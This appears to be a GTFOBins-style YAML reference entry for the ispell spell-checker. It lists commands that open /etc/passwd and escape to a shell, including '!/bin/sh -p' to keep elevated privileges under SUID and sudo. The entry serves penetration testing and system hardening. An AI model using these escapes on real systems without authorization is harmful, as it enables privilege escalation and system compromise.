---
functions:
  shell:
    - code: |
        ispell /etc/passwd
        !/bin/sh
  suid:
    - code: |
        ./ispell /etc/passwd
        !/bin/sh -p
  sudo:
    - code: |
        sudo ispell /etc/passwd
        !/bin/sh
---
